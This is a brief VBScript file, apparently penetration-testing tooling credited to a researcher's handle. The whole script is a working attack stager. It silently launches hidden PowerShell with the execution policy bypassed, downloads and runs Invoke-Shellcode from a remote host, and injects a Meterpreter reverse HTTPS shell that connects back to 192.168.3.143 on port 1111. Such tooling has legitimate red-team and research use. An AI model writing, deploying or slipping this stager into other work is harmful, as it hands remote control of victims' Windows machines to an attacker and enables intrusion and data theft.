'Matt Nelson
'@enigma0x3
'www.enigma0x3.wordpress.com

Dim objShell

Set objShell = WScript.CreateObject( "WScript.Shell" )

command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('http://192.168.3.143/Invoke-Shellcode')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.3.143 -Lport 1111 -Force"

objShell.Run command,0

Set objShell = Nothing

